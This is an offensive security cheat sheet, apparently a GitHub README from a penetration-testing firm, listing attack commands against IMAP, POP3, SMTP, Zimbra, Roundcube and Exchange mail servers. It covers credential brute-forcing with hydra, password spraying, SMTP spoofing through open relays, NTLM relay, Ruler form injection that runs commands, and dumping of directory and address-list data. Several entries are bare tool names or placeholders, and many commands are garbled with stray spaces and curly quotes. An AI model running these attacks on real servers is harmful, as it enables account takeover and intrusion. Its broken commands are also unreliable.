# Mail-Server-Attacks-Cheat-Sheet
A cheat sheet that contains common enumeration and attack methods for Mail Server.

![Mail Attacks](https://github.com/HadessCS/Mail-Server-Attacks-Cheat-Sheet/blob/main/mailattacks_cover.png)

Brought to you by:

<img src="https://hadess.io/wp-content/uploads/2022/04/LOGOTYPE-tag-white-.png" alt="HADESS" width="200"/>

[HADESS](https://hadess.io) performs offensive cybersecurity services through infrastructures and software that include vulnerability analysis, scenario attack planning, and implementation of custom integrated preventive projects. We organized our activities around the prevention of corporate, industrial, and laboratory cyber threats.

- [IMAP](#imap)
  * [Information Gathering](#information-gathering)
  * [Attacks](#attacks)
    + [NTLM Auth](#ntlm-auth)
    + [Bruteforce](#bruteforce)
- [POP3](#pop3)
  * [Information Gathering](#information-gathering-1)
  * [Attacks](#attacks-1)
    + [NTLM Auth](#ntlm-auth-1)
    + [Bruteforce](#bruteforce-1)
- [SMTP](#smtp)
  * [Information Gathering](#information-gathering-2)
  * [Attacks](#attacks-2)
    + [NTLM Auth](#ntlm-auth-2)
    + [Bruteforce](#bruteforce-2)
    + [Spoofing](#spoofing)
    + [Non Auth](#non-auth)
- [Zimbra](#zimbra)
  * [Information Gathering](#information-gathering-3)
  * [Attacks](#attacks-3)
    + [Misconfiguration](#misconfiguration)
    + [Anti-Malware](#anti-malware)
    + [ActiveSync(LDAP)](#activesyncldap)
    + [ActiveSync(SMB Share)](#activesyncsmb-share)
    + [Phishing](#phishing)
    + [Known Vuln](#known-vuln)
    + [Spray](#spray)
- [Roundcube](#roundcube)
  * [Information Gathering](#information-gathering-4)
  * [Attacks](#attacks-4)
    + [Anti-Malware](#anti-malware-1)
    + [ActiveSync(LDAP)](#activesyncldap-1)
    + [ActiveSync(SMB Share)](#activesyncsmb-share-1)
    + [Phishing](#phishing-1)
    + [Known Vuln](#known-vuln-1)
    + [Spray](#spray-1)
- [Microsoft Exchange](#microsoft-exchange)
  * [Information Gathering](#information-gathering-5)
  * [Attacks](#attacks-5)
    + [AutotDiscover](#autotdiscover)
    + [Known Vuln](#known-vuln-2)
    + [Spray](#spray-2)
    + [NTLM Auth](#ntlm-auth-3)
    + [NTLMRelay](#ntlmrelay)
    + [GAL](#gal)
    + [Exchange Admin Group Deligation](#exchange-admin-group-deligation)
    + [Rule](#rule)
    + [Forms](#forms)
    + [Anti-Malware](#anti-malware-2)
    + [ActiveSync(LDAP)](#activesyncldap-2)
    + [ActiveSync(SMB Share)](#activesyncsmb-share-2)
    + [ActiveSync(WSS)](#activesyncwss)
    + [RPC](#rpc)
    + [LDAP](#ldap)
    + [Phishing](#phishing-2)


## IMAP

### Information Gathering


```bash
  nmap [-sS] [-sC] -Pn -p 143,993 -sV --script=banner [IP]
```

```bash
  nc -nv <IP> 993 [IP]
```

```bash
  shodan search "port:143"
```

### Attacks

#### NTLM Auth

```bash
   telnet example.com 143
```

```bash
   a1 AUTHENTICATE NTLM 
```

```bash
   nmap --script=imap-ntlm-info [IP]
```

#### Bruteforce

```bash
   hydra -l USERNAME -P passwords.txt -f [IP] imap -V
```

```bash
   hydra -S -v -l USERNAME -P passwords.txt -s 993 -f [IP] imap -V
```

```bash
   nmap -sV --script imap-brute -p [PORT] [IP]
```

## POP3

### Information Gathering


```bash
  nmap [-sS] [-sC] -Pn -p 110,995 -sV --script=banner [IP]
```

```bash
  nc -nv <IP> 110 [IP]
```

```bash
  shodan search "port:995"
```

### Attacks

#### NTLM Auth

```bash
   nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -port [PORT] [IP]
```

```bash
   a1 AUTHENTICATE NTLM 
```



#### Bruteforce

```bash
   nmap -p110 --script pop3-brute <target>
```

```bash
   hydra -l muts -P pass.txt [IP] pop3
```


## SMTP

### Information Gathering

```bash
  nmap [-sS] [-sC] -Pn -p 25,465,587 -sV --script=banner or --script smtp-commands [IP]
```

```bash
  nc -nv <IP> 25 [IP]
nc -nv <IP> 465 [IP]
nc -nv <IP> 587 [IP]
```

```bash
  shodan search "port:25"
shodan search "port:465"
shodan search "port:587"
```


### Attacks

#### NTLM Auth

```bash
telnet example.com 587 
HELO
AUTH NTLM 334 
```

```bash
   a1 AUTHENTICATE NTLM 
```



#### Bruteforce

```bash
   nmap -p[25,465,587] --script smtp-brute <target>
```

```bash
   hydra -l muts -P pass.txt [IP] smtp
```

#### Spoofing

```bash
   emkei.cz
```

#### Non Auth

```bash
telnet [IP] [25 or 465 or 587]
MAIL FROM: sender@adress.ext
RCPT TO: recipient@adress.ext
SUBJECT: Test message
.

```

## Zimbra

### Information Gathering

```bash
  shodan search "8.8.6_GA_1906"
```

```bash
  shodan search "zimbra"
```


### Attacks

#### Misconfiguration

```bash
   modules/auxiliary/gather/memcached_extractor
```

#### Anti-Malware

```bash
evilmacro
macropack
...
```

#### ActiveSync(LDAP)

```bash
   LDAPPER. py -D EVIL -U 'Administrator' -P ‘password’ -S DC02.EVIL.DEV
' (msExchDeviceID=123456)
```

#### ActiveSync(SMB Share)

```bash
   peas - u ' EVIL.DEV\sh' -p '[password]' mail.evil.dev --list-unc'\\DC01\'
```


#### Phishing

```bash
   gophish
```


#### Known Vuln

```bash
CVE‑2022‑37042
CVE‑2022‑37041
CVE‑2022‑37044
```

#### Spray

```bash
   POST
```

## Roundcube

### Information Gathering

```bash
  shodan search "http.title:'Roundcube Webmail :: Welcome to Roundcube Webmail'"
```

```bash
  shodan search "http.favicon.hash:976235259"
```


### Attacks

#### Anti-Malware

```bash
evilmacro
macropack
...
```

#### ActiveSync(LDAP)

```bash
   LDAPPER. py -D EVIL -U 'Administrator' -P ‘password’ -S DC02.EVIL.DEV
' (msExchDeviceID=123456)
```

#### ActiveSync(SMB Share)

```bash
   peas - u ' EVIL.DEV\sh' -p '[password]' mail.evil.dev --list-unc'\\DC01\'
```


#### Phishing

```bash
   gophish
```


#### Known Vuln

```bash
   2021-44026
```

#### Spray

```bash
   POST
```


## Microsoft Exchange

### Information Gathering

```bash
shodan search "'X-AspNet-Version http.title:'Outlook' –'x-owa-version'"
shodan search "http.favicon.hash:44274939"
shodan search "http.title:outlook exchange"
```



### Attacks

#### AutotDiscover

```bash
   autodiscover/autodiscover.xml
```

#### Known Vuln

```bash
ProxyLogon(2021-26855)
ProxyShell(2021-34473)
HAFNIUM(2021-26858)
```

#### Spray

```bash
Invoke-PasswordSprayOWA
Invoke-PasswordSprayEWS
```

#### NTLM Auth

```bash
   nmap --script http-ntlm-info
```

#### NTLMRelay

```bash
reponder
./exchangeRelayx.py -t https://mail.evil.com
```

#### GAL

```bash
Get-GlobalAddressList -ExchHostname mail.domain.com -UserName
domain\username -Password password -OutFile global-address-list.txt
```

#### Exchange Admin Group Deligation

```bash
Bloodhound
net
```

#### Rule

```bash
   GUI
```


```bash
   Ruler
```

#### Forms

```bash
   ./ruler --email user@evil.dev form add --suffix superduper --input command.txt --send
```


#### Anti-Malware

```bash
evilmacro
macropack
...
```

#### ActiveSync(LDAP)

```bash
   LDAPPER. py -D EVIL -U 'Administrator' -P ‘password’ -S DC02.EVIL.DEV
' (msExchDeviceID=123456)
```

#### ActiveSync(SMB Share)

```bash
   peas - u ' EVIL.DEV\sh' -p '[password]' mail.evil.dev --list-unc'\\DC01\'
```

#### ActiveSync(WSS)

```bash
   peas -U ' EVIL.DEC\user’ -p ‘password’ exch01.evil.dev - -smb-user=‘EVIL\sharepoint-setup'
• - smb-pass=' password’ •-list-unc 'http://SHP01/share’
```

#### RPC

```bash
   nmap mail.evil.dev -p 6001 -sV - sC
```


```bash
 rpcmap . py -debug -auth-transport’EVIL/user:password’
'ncacn http: /6001,RpcProxy=mail.evil.dev: 443]'
```


```bash
 rpcmap.py -debug -auth-transport 'EVIL/user:password' -auth-rpc 'EVIL/mia:password' -auth-level 6 -brute-opnums 'ncacn_http:[6001,RpcProxy=mail.evil.dev:443]'
```

#### LDAP

```bash
 LDAPPER. py -D EVIL - U 'Administrator' -P ‘password’ -S DC01. EVIL.DEV
(mail=user@evil.dev) mail objectGUID legacyExchangeDN distinguishedName
```

```bash
exchanger. py EVIL/user: ‘password’@mail.evil.dev nspi
dump -tables -name Hackers -lookup-tvpe EXTENDED
```

#### Phishing

```bash
   gophish
```




